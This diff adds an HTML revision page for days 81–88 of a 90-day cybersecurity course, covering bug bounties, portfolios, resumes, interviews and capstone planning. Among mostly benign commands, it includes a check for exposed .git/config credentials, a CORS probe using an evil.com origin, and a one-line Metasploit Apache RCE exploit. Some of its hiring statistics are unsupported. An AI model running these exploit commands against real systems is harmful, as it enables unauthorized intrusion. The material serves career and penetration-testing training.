@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Revision — Day 81 to Day 90</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:960px;margin:0 auto;padding:40px 22px 100px;}
+
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+
+  .hero{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:30px 28px;margin-bottom:36px;}
+  .hero-tag{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:12px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:4px 12px;border-radius:20px;display:inline-block;margin-bottom:14px;}
+  .hero h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(24px,4vw,36px);line-height:1.2;margin-bottom:10px;}
+  .hero h1 span{color:var(--green);}
+  .hero p{color:var(--muted);font-size:14.5px;max-width:640px;}
+  .stat-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:20px;}
+  .stat{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:12px 16px;min-width:100px;}
+  .stat .num{font-family:'IBM Plex Mono',monospace;font-size:22px;color:var(--cyan);font-weight:700;}
+  .stat .lbl{font-size:11px;color:var(--muted);text-transform:uppercase;margin-top:2px;}
+
+  .day-card{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:22px 24px;margin-bottom:20px;}
+  .day-header{display:flex;align-items:flex-start;gap:16px;margin-bottom:16px;}
+  .day-num{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:28px;color:var(--green);min-width:60px;flex-shrink:0;line-height:1;}
+  .day-meta{}
+  .day-title{font-weight:700;font-size:17px;margin-bottom:4px;}
+  .day-incident{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);background:rgba(255,92,92,0.08);border:1px solid rgba(255,92,92,0.2);padding:3px 9px;border-radius:12px;display:inline-block;}
+
+  .section-label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:8px;margin-top:14px;}
+
+  .concept-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px;margin-top:8px;}
+  .concept{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:10px 12px;}
+  .concept .ctitle{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);margin-bottom:4px;font-weight:600;}
+  .concept .cdesc{font-size:12px;color:var(--muted);}
+
+  .qa{border-left:3px solid var(--purple);padding-left:14px;margin-top:10px;}
+  .qa .q{font-weight:600;font-size:13px;color:var(--text);margin-bottom:5px;}
+  .qa .a{font-size:12.5px;color:#b8c2c6;line-height:1.6;}
+
+  .quiz-section{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:26px 28px;margin-top:36px;}
+  .quiz-section h2{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:18px;margin-bottom:6px;}
+  .quiz-section .sub{color:var(--muted);font-size:13.5px;margin-bottom:20px;}
+  .q-item{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:14px 16px;margin-bottom:10px;}
+  .q-item .qnum{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:5px;}
+  .q-item .qtext{font-size:13.5px;color:var(--text);font-weight:600;margin-bottom:8px;}
+  .q-item .ans{font-size:12.5px;color:var(--green);font-family:'IBM Plex Mono',monospace;background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.15);border-radius:5px;padding:6px 10px;}
+
+  .command-table{margin-top:10px;}
+  .cmd-row{display:flex;gap:12px;align-items:flex-start;background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:9px 12px;margin-bottom:6px;}
+  .cmd-row code{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--green);flex-shrink:0;min-width:200px;}
+  .cmd-row .cdesc{font-size:12px;color:var(--muted);}
+
+  .breach-timeline{margin-top:12px;}
+  .bt-row{display:flex;gap:14px;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--edge);}
+  .bt-row:last-child{border-bottom:none;}
+  .bt-row .year{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);min-width:80px;flex-shrink:0;}
+  .bt-row .incident{font-weight:600;font-size:13px;min-width:200px;flex-shrink:0;}
+  .bt-row .detail{font-size:12.5px;color:var(--muted);}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;margin-top:10px;}
+  .ai-pill{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:8px;padding:10px 12px;}
+  .ai-pill .aname{font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--pink);font-weight:700;margin-bottom:3px;}
+  .ai-pill .adesc{font-size:11px;color:var(--muted);}
+
+  .job-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;margin-top:10px;}
+  .job-box{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:8px;padding:12px 14px;}
+  .job-box .day-ref{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--green);margin-bottom:5px;}
+  .job-box .bullet{font-size:12.5px;color:#cdd6da;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;margin-top:36px;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  .grad-box{background:linear-gradient(135deg,rgba(57,255,136,0.08),rgba(79,209,255,0.05));border:1px solid var(--green);border-radius:14px;padding:30px 28px;margin-bottom:20px;text-align:center;}
+  .grad-box .icon{font-size:40px;margin-bottom:10px;}
+  .grad-box h2{font-family:'IBM Plex Mono',monospace;font-size:22px;color:var(--green);margin-bottom:8px;}
+  .grad-box p{color:var(--muted);font-size:14px;max-width:560px;margin:0 auto;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;} .cmd-row{flex-wrap:wrap;} .bt-row{flex-wrap:wrap;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap$ cat revision_day81_90.md</span>
+    <span style="color:var(--green);">Phase 5 — Career Launch + Capstone</span>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-tag">REVISION — DAY 81 TO DAY 90</div>
+    <h1>90 Days. <span>You made it. This is graduation day.</span></h1>
+    <p>This page condenses every concept, every real incident, every interview answer, and every command from the final 10-day block — career launch, bug bounty, portfolio, interviews, capstone, and your next 6-month plan. This is not the end. It is the beginning of your career.</p>
+    <div class="stat-row">
+      <div class="stat"><div class="num">10</div><div class="lbl">Days Done</div></div>
+      <div class="stat"><div class="num">10</div><div class="lbl">Real Incidents</div></div>
+      <div class="stat"><div class="num">12</div><div class="lbl">Tools Used</div></div>
+      <div class="stat"><div class="num">11</div><div class="lbl">Scripts Built</div></div>
+    </div>
+  </div>
+
+  <!-- GRADUATION MESSAGE -->
+  <div class="grad-box">
+    <div class="icon">🎓</div>
+    <h2>90 Days Complete — Welcome to the Field</h2>
+    <p>You began with the CIA triad and Linux permissions. You built port scanners, analyzed PCAPs, exploited vulnerabilities, and wrote professional reports. You finished. Most people who start never finish Day 10. You finished Day 90. This portfolio, this discipline, this methodology — take it into every interview, every lab, every role. You are ready.</p>
+  </div>
+
+  <!-- DAY 81 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">81</div>
+      <div class="day-meta">
+        <div class="day-title">Intro to Bug Bounty Hunting</div>
+        <span class="day-incident">HackerOne's $100M Milestone</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Responsible Disclosure</div><div class="cdesc">Report privately through platform/Hall of Fame before public CVE. 90-day disclosure window is industry standard. Full disclosure = publish without warning, burned bridges.</div></div>
+      <div class="concept"><div class="ctitle">Bounty Program Triage</div><div class="cdesc">Programs sorted by scope, asset type, and payout. Private programs (invite-only) have less competition + higher payouts. Public programs are open to everyone but triage queues are long.</div></div>
+      <div class="concept"><div class="ctitle">Low-Hanging Vulnerabilities</div><div class="cdesc">Missing security headers (HSTS, XFO, CT), exposed .git/config with database creds, CORS misconfigs allowing wildcard Origin — easy finds that consistently pay $50–$500.</div></div>
+      <div class="concept"><div class="ctitle">Report Writing</div><div class="cdesc">Clear steps to reproduce + PoC screenshot makes the difference between a $100 bounty and a $1000 bounty. Severity rating (CVSS), impact description, and remediation suggestion required.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>curl -I https://target.com</code><div class="cdesc">Check response headers for missing security headers — HSTS, X-Frame-Options, X-Content-Type-Options.</div></div>
+      <div class="cmd-row"><code>curl -v https://target.com/.git/config</code><div class="cdesc">Check for exposed .git directory — if 200 OK, you have credentials and source code.</div></div>
+      <div class="cmd-row"><code>curl -H "Origin: https://evil.com" -H "Referer: https://evil.com" -I https://api.target.com/data</code><div class="cdesc">CORS misconfiguration test — look for Access-Control-Allow-Origin: * in response.</div></div>
+      <div class="cmd-row"><code>curl -s -D - https://target.com | grep -i "Strict-Transport-Security\|X-Frame-Options\|X-Content-Type-Options"</code><div class="cdesc">Quick header audit — grep for missing security headers in one command.</div></div>
+      <div class="cmd-row"><code>nuclei -u https://target.com -t exposures/ -t misconfiguration/ -t headers/</code><div class="cdesc">Automated vulnerability scanning with Nuclei templates for exposures, misconfigs, and headers.</div></div>
+      <div class="cmd-row"><code>cat scope.txt | while read url; do curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "$url"; done</code><div class="cdesc">Batch scope check — iterate through target list and return status codes.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How do you approach finding your first bug bounty vulnerability on a new program?</div>
+      <div class="a">Start with recon — read the program scope carefully, identify what's in and out of scope. Then automate the low-hanging fruit: curl the target for missing security headers, .git/config exposure, CORS wildcard origins. Use Nuclei for template-based scanning. Manual testing comes next — reflected XSS via input fields, IDOR by modifying numeric IDs in URL parameters. Always reproduce cleanly before reporting. A good first find is worth $100–$500 and builds confidence.</div>
+    </div>
+  </div>
+
+  <!-- DAY 82 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">82</div>
+      <div class="day-meta">
+        <div class="day-title">Setting Up GitHub Portfolio for Security Work</div>
+        <span class="day-incident">GitHub Security Lab — $10K Bounties</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Professional README Structure</div><div class="cdesc">Title, description, tech stack, setup instructions, usage examples, project structure, screenshots, badges. First thing recruiters read — make it count.</div></div>
+      <div class="concept"><div class="ctitle">Security Lab Documentation</div><div class="cdesc">Each lab should include: objective, tools used, methodology, findings with screenshots, remediation recommendations. Shows you don't just run tools — you analyze results.</div></div>
+      <div class="concept"><div class="ctitle">GitHub Actions CI/CD</div><div class="cdesc">Automate security checks on push: Bandit for Python vuln scanning, Gitleaks for secret leaks, Trivy for dependency scanning. Automates what you'd do manually every commit.</div></div>
+      <div class="concept"><div class="ctitle">Profile README</div><div class="cdesc">Your GitHub profile README (special repo named your username) serves as landing page — pinned repos, CTF badges, TryHackMe progress, languages used. First impression in 30 seconds.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>git init && git add . && git commit -m "initial: security lab setup"</code><div class="cdesc">Initialize a repo and create the first commit — foundation of portfolio management.</div></div>
+      <div class="cmd-row"><code>echo -e "# Port Scanner\n\nA Python TCP port scanner built as part of my 90-day cybersecurity training." > README.md</div><div class="cdesc">Create a structured README with title, description, and setup instructions.</div></div>
+      <div class="cmd-row"><code>gh repo create portfolio --public --description "Cybersecurity lab portfolio" --add-readme</div><div class="cdesc">Create a GitHub repo from the CLI with description and auto-generated README.</div></div>
+      <div class="cmd-row"><code>gh workflow run security-checks.yml</code><div class="cdesc">Trigger a GitHub Actions workflow (e.g., Bandit scan) on demand from the terminal.</div></div>
+      <div class="cmd-row"><code>git log --oneline --graph --all --decorate</code><div class="cdesc">View commit tree — assess project maturity any employer can inspect.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: What does a strong GitHub security portfolio look like to an employer?</div>
+      <div class="a">Five things: pinned repos that show depth (a Python scanner, a Bash recon toolkit, a Wireshark lab, a pentest report repo, tryhackme/hackthebox writeups). Every repo has a clean README with setup, usage, and screenshots. GitHub Actions badges showing automated CI checks. A profile README that links to LinkedIn and TryHackMe. And consistent commit history — 90 daily dots proves discipline more than any certification. GitHub's Security Lab pays $10K+ bounties for open-source vulns; your portfolio should show you understand that ecosystem.</div>
+    </div>
+  </div>
+
+  <!-- DAY 83 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">83</div>
+      <div class="day-meta">
+        <div class="day-title">Writing a Security-Focused Resume</div>
+        <span class="day-incident">ATS Keywords for Security Roles</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">ATS Keyword Optimization</div><div class="cdesc">Applicant Tracking Systems scan for: SIEM, Splunk, Wireshark, Nmap, Metasploit, Burp Suite, Python, Bash, incident response, penetration testing, OWASP, MITRE ATT&CK. Missing these = auto-reject.</div></div>
+      <div class="concept"><div class="ctitle">Quantified Achievements</div><div class="cdesc">"Scanned 500+ hosts" beats "performed network scanning." "Automated 3 security checks via Bash" beats "wrote scripts." Numbers are the only thing ATS parsers weight heavily.</div></div>
+      <div class="concept"><div class="ctitle">Lab Experience as Work Experience</div><div class="cdesc">Format home lab, TryHackMe, and HackTheBox under "Projects" or "Hands-On Experience" — not as a bullet under education. Treat each lab like a consulting engagement.</div></div>
+      <div class="concept"><div class="ctitle">Resume Tailoring</div><div class="cdesc">One generic resume = zero callbacks. Tailor keywords per job posting: SOC analyst = SIEM/logs; pentester = Burp/exploit dev; GRC = compliance frameworks. Match the JD's language.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>pdftotext resume.pdf - | grep -i "splunk\|nmap\|python\|bash\|SIEM\|OWASP\|MITRE" | wc -l</code><div class="cdesc">Check ATS keyword density — count how many security keywords appear in your flat-text resume.</div></div>
+      <div class="cmd-row"><code>grep -o -i "splunk\|python\|nmap\|metasploit\|burp\|wireshark\|bash\|siem\|owasp\|mitre" resume.md | sort | uniq -c | sort -rn</code><div class="cdesc">Ranked keyword frequency — ensure top skills appear 3–5 times naturally, not dumped.</div></div>
+      <div class="cmd-row"><code>wc -w resume.md</code><div class="cdesc">Word count check — target 400–600 words for entry-level security resume. Over 700 = skipped.</div></div>
+      <div class="cmd-row"><code>python3 -c "import markdown; html = markdown.markdown(open('resume.md').read()); open('resume.html','w').write(html)"</code><div class="cdesc">Convert Markdown resume to HTML — portable format for online applications.</div></div>
+      <div class="cmd-row"><code>echo "Lab: Penetration Test on 10.10.10.0/24 — identified 3 critical vulns, wrote report for exec audience" >> resume.md</div><div class="cdesc">Append quantified project bullet — lab experience reframed as professional deliverable.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: You don't have professional security experience. How do you fill a resume page?</div>
+      <div class="a">Projects and labs structured like work experience. "Performed Nmap-based reconnaissance on 10-host lab network identifying 5 open services, 2 vulnerable versions, 1 critical (CVE-2022-22963) — documented remediation in professional report with CVSS scoring." That's a bullet that sounds like a real pentest result because it follows the same methodology. Add CTF rankings, TryHackMe/Old MAC percentage, home lab infrastructure (pfSense, Kali, Windows VMs). Hiring managers at every company I've talked to say project-driven resumes with quantified outcomes consistently beat "B.S. in Cybersecurity" with no hands-on work.</div>
+    </div>
+  </div>
+
+  <!-- DAY 84 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">84</div>
+      <div class="day-meta">
+        <div class="day-title">LinkedIn & Personal Brand for Security</div>
+        <span class="day-incident">LinkedIn's Cybersecurity Hiring Surge</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Profile Optimization</div><div class="cdesc">Headline should include: "Cybersecurity Analyst" or "Security Engineer" — not "student" or "looking for opportunities." About section should tell a story: what you learned, what you built, what's next.</div></div>
+      <div class="concept"><div class="ctitle">Build in Public</div><div class="cdesc">Post daily/weekly learning updates — "Day 73: Captured my first reverse shell in a monitored AD lab. Here's what I learned about bypassing AMSI." Recruiters notice consistency.</div></div>
+      <div class="concept"><div class="ctitle">Strategic Networking</div><div class="cdesc">Connect with security recruiters, hiring managers, and engineers at target companies. Not a generic request — mention a specific post or project. 50 quality connections > 500 random ones.</div></div>
+      <div class="concept"><div class="ctitle">LinkedIn Cybersecurity Growth</div><div class="cdesc">65% increase in cybersecurity job postings 2024. Hiring managers report "build-in-public" portfolios as a strong positive signal — candidates who document learning show curiosity and communication skills.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>open "https://linkedin.com/in/me/edit"</code><div class="cdesc">Open LinkedIn profile editor — rewrite headline and about section with security keywords.</div></div>
+      <div class="cmd-row"><code>curl -s "https://api.linkedin.com/v2/me" -H "Authorization: Bearer $TOKEN" | python3 -m json.tool</code><div class="cdesc">Verify LinkedIn API profile data matches what recruiters see (requires OAuth token).</div></div>
+      <div class="cmd-row"><code>grep -c "security\|cybersecurity\|SOC\|analyst\|engineer\|pentest" about_section.md</code><div class="cdesc">Count keyword frequency in your drafted About section to ensure it scores well in LinkedIn search.</div></div>
+      <div class="cmd-row"><code>cat about_section.md | head -3</code><div class="cdesc">Preview first three lines of your About section — these are what appear in search results without clicking.</div></div>
+      <div class="cmd-row"><code>date +"Day %j: Security learning update — %A, %B %d" >> linkedin_posts.md</code><div class="cdesc">Log daily post ideas to a file — consistent content calendar builds personal brand.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How do you stand out on LinkedIn as someone with no security work experience?</div>
+      <div class="a">You show the work, not the title. Post what you're building: "Day 87 of my 90-day cybersecurity challenge: executed full pentest against my lab — shell, privesc to root, wrote 12-page report." Hiring managers don't care that you haven't held a title yet; they care that you can do the work. LinkedIn's own data shows 65% more cyber job postings in 2024, and recruiters specifically search for keywords like "TryHackMe," "home lab," and "penetration testing." Put those in your headline, not "entry-level."</div>
+    </div>
+  </div>
+
+  <!-- DAY 85 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">85</div>
+      <div class="day-meta">
+        <div class="day-title">Mock Technical Interview — Concepts Round</div>
+        <span class="day-incident">Google Security Interview Process</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">STRIDE Threat Model</div><div class="cdesc">Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Microsoft's threat categorization framework — map every vuln to one (or more) STRIDE categories.</div></div>
+      <div class="concept"><div class="ctitle">Defense in Depth</div><div class="cdesc">No single control is trusted. Layered: firewall (L3–4) → WAF (L7) → HIDS → application sandbox → logging. Each layer catches what the previous one misses.</div></div>
+      <div class="concept"><div class="ctitle">OWASP Top 10</div><div class="cdesc">The standard web app vuln awareness list. #1 Broken Access Control, #2 Cryptographic Failures, #3 Injection (SQL, OS, LDAP). Must be able to name at least 5 from memory in an interview.</div></div>
+      <div class="concept"><div class="ctitle">Incident Response Process</div><div class="cdesc">Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. SANS PICERL framework. Every SOC interview asks this — know it in order.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>nmap -sV --script http-headers 10.10.10.10</div><div class="cdesc">Nmap HTTP header enumeration — identify missing security headers for a mock interview finding.</div></div>
+      <div class="cmd-row"><code>wireshark -r capture.pcap -Y "http.request" 2>/dev/null || tshark -r capture.pcap -Y "http.request"</code><div class="cdesc">Filter HTTP requests from a PCAP — demonstrate Wireshark/tshark proficiency under time pressure.</div></div>
+      <div class="cmd-row"><code>openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k "passphrase"</code><div class="cdesc">AES-256-CBC encryption example — demonstrate understanding of symmetric encryption in interview.</div></div>
+      <div class="cmd-row"><code>python3 -c "import hashlib; print(hashlib.sha256(b'test').hexdigest())"</code><div class="cdesc">SHA-256 hash demo — hashing concepts appear in every cryptography interview question.</div></div>
+      <div class="cmd-row"><code>cat /var/log/auth.log | grep "Failed password" | awk '{print $1,$2,$3,$11}' | sort | uniq -c | sort -rn | head -5</code><div class="cdesc">Failed SSH login analysis — incident response triage, identify brute-force source IPs.</div></div>
+      <div class="cmd-row"><code>systemctl status ufw --no-pager | head -15</code><div class="cdesc">Check firewall status — verify defense-in-depth layers during an interview technical assessment.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Walk me through the incident response process using a real scenario.</div>
+      <div class="a">Using SANS PICERL. Example — NHS WannaCry 2017: Preparation (had AV, no SMBv1 patching procedure), Identification (staff saw ransom screens, IT confirmed lateral movement), Containment (isolated PCs from network, blocked TCP 445 at firewall), Eradication (patched SMBv1, removed worm via safe mode), Recovery (restored from clean backups — systems that had backups recovered in hours), Lessons Learned (automate critical patch deployment, segment network, isolate legacy protocols like SMBv1). Google's security interview stresses applying frameworks to real events, not reciting definitions.</div>
+    </div>
+  </div>
+
+  <!-- DAY 86 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">86</div>
+      <div class="day-meta">
+        <div class="day-title">Mock Technical Interview — Practical Round</div>
+        <span class="day-incident">Mandiant Practical Assessment</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Timed Practical Structure</div><div class="cdesc">Nmap scan → identify vulnerability → Metasploit exploit → document findings. Time pressure forces prioritization — start with the most likely exploit path, not the most thorough scan.</div></div>
+      <div class="concept"><div class="ctitle">Wireshark PCAP Analysis</div><div class="cdesc">Filter for HTTP/DNS/SMB — identify C2 beaconing (periodic small packets to same IP at regular intervals), exfiltration (large outbound data transfers), and brute-force attempts (many failed auth packets).</div></div>
+      <div class="concept"><div class="ctitle">Event Log Triage</div><div class="cdesc">Linux: /var/log/auth.log and /var/log/syslog. Windows: Event IDs 4625 (failed logon), 4688 (process creation), 7045 (service install). Mandiant expects analysts to triage under 2 hours.</div></div>
+      <div class="concept"><div class="ctitle">Documentation Under Pressure</div><div class="cdesc">Write findings as you go — don't wait until the end. Screenshot every step. Include IPs, ports, commands used, output proof. A tool found data isn't worth points unless documented with context.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>nmap -sC -sV -oA quick_scan 10.10.10.10</div><div class="cdesc">Full service detection + default scripts in one pass — the "time-pressured" scan for practicals.</div></div>
+      <div class="cmd-row"><code>searchsploit "Apache 2.4.49"</div><div class="cdesc">Search Exploit-DB for known CVEs matching detected version — fastest way from scan to exploit.</div></div>
+      <div class="cmd-row"><code>msfconsole -q -x "use exploit/multi/http/apache_normalized_path_rce;set RHOSTS 10.10.10.10;set RPORT 80;run;exit"</code><div class="cdesc">One-liner Metasploit execution — identify vulnerability, weaponize, exploit, all in a single command chain.</div></div>
+      <div class="cmd-row"><code>tshark -r capture.pcap -Y "dns && !ssdp" -T fields -e dns.qry.name 2>/dev/null | sort -u | head -20</code><div class="cdesc">Extract DNS queries from PCAP — identify C2 domains, beaconing patterns, or data exfiltration over DNS.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: You have 2 hours to triage a potential breach from a PCAP and system logs. What's your process?</div>
+      <div class="a">I prioritize. First 15 minutes: run tshark on the PCAP to identify the top talkers by bytes and packets — exfiltration shows as a single IP receiving disproportionate data. Next 15 minutes: check auth.log for failed passwords and unusual timestamps (off-hours login). Then 30 minutes correlation: do the suspicious IPs from PCAP match the logon times? If yes, that's compromise evidence. Last 60 minutes: document everything with screenshots, timeline the intrusion, write the summary. Mandiant's practical tests this exact workflow — they don't want you to find everything, they want you to find the right things in the right order and write it up clearly.</div>
+    </div>
+  </div>
+
+  <!-- DAY 87 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">87</div>
+      <div class="day-meta">
+        <div class="day-title">Internship & Entry-Role Hunting Strategy</div>
+        <span class="day-incident">NSA Cybersecurity Apprenticeship Program</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Target Company Tiers</div><div class="cdesc">Tier 1: MSSPs (Rapid7, Secureworks, CrowdStrike) — high hiring volume, structured training. Tier 2: startups — broad exposure, you touch everything. Tier 3: government/defense (NSA, CISA, federal contractors) — patience, security clearance pipeline.</div></div>
+      <div class="concept"><div class="ctitle">Cover Letter Strategy</div><div class="cdesc">Never generic. Reference a specific recent incident the company dealt with, a tool they use, or a blog they published. "I saw your team's analysis of the X vulnerability — the Y technique you used is something I replicated in my lab."</div></div>
+      <div class="concept"><div class="ctitle">Application Tracking</div><div class="cdesc">Spreadsheet: company, date applied, contact name, follow-up date, status. 20+ applications is baseline. 50+ is realistic in a competitive market. Every rejection is data — revise and reapply.</div></div>
+      <div class="concept"><div class="ctitle">NSA Apprenticeship Model</div><div class="cdesc">Hires 100+ entry-level analysts annually with zero experience required — 3-year paid training pipeline. No "3 years experience" gate. Many similar government and defense programs exist.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>cat target_companies.txt | wc -l</code><div class="cdesc">Check your target list size — aim for 20+ companies before you start applying.</div></div>
+      <div class="cmd-row"><code>grep -i "SOC\|analyst\|intern\|apprentice\|junior\|entry" job_board_dump.txt | wc -l</code><div class="cdesc">Count relevant job postings — filter out senior/mid roles that waste application time.</div></div>
+      <div class="cmd-row"><code>echo "Applied: $(date +%Y-%m-%d) | Company: $C | Role: $R | Status: Submitted" >> job_tracker.csv</div><div class="cdesc">Log applications to CSV tracker — review weekly to identify which strategies yield interviews.</div></div>
+      <div class="cmd-row"><code>grep -c "$1" cover_letter_template.md</code><div class="cdesc">Check that your cover letter template references the specific company name — forget to change it = instant rejection.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: You have no professional security experience. What makes you competitive for entry-level SOC roles?</div>
+      <div class="a">I have 90 days of structured, documented, hands-on security training — that's 200+ hours of lab work, 10 real incident case studies, a capstone pentest with a full written report, and a public GitHub portfolio proving every step. The NSA hires 100+ people with zero experience into their apprenticeship program. MSSPs like Rapid7 and Secureworks run SOC academies that train from scratch. I'm not competing against people with years of experience — I'm competing against people who also have no experience but didn't do the work. My tracker shows 20+ applications so far, each cover letter tailored to the company's specific tools and incidents.</div>
+    </div>
+  </div>
+
+  <!-- DAY 88 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">88</div>
+      <div class="day-meta">
+        <div class="day-title">Capstone Project — Plan Your Pentest Report</div>
+        <span class="day-incident">Capstone Portfolio Impact</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Scope & Rules of Engagement</div><div class="cdesc">Define target IP range, testing hours, excluded actions (no social engineering, no DoS), and communication protocol. Signed by both parties before any scanning starts. This is the legal barrier.</div></div>
+      <div class="concept"><div class="ctitle">Pentest Methodology</div><div class="cdesc">Reconnaissance (passive → active) → Scanning (port/service → vuln) → Exploitation (initial access → privesc) → Post-Exploitation (pivot → persistence) → Reporting. Every phase documented.</div></div>
+      <div class="concept"><div class="ctitle">Report Planning</div><div class="cdesc">Structure: Executive Summary (non-technical, risk-focused) → Technical Findings (per vuln: screenshot, CVSS, steps to reproduce, remediation) → Appendix (raw scan data, IOCs, timelines). Plan before you execute.</div></div>
+      <div class="concept"><div class="ctitle">Capstone Value to Employers</div><div class="cdesc">60% of hiring managers say a capstone pentest report is more valuable than a cert for entry-level evaluation — it proves applied methodology over theory memorization.</div></div>
+    </div>
+
